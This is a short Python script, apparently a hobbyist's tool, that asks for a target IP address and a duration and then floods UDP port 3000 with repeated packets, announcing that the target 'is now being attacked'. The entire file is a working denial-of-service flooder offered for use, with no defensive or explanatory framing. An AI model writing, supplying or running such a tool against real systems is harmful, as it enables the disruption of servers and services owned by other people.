import socket
import time

def dosAttack(): 
    ip_address = raw_input("input ip address you want to attack, eg.(127.0.0.1) \n")
    attack_second = input("for how long you want to attack the server in second eg.(10) \n")
    port = 3000
    start_second= time.time();

    socket_connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket_connection.connect((ip_address, port))
    
    while True:
        if ((time.time() - start_second) >= attack_second):
            break
        
        print(ip_address+ " is now being attacked")
        socket_connection.send("some word")
    print(ip_address + " attack completed")
        

def main():
     dosAttack()


main()

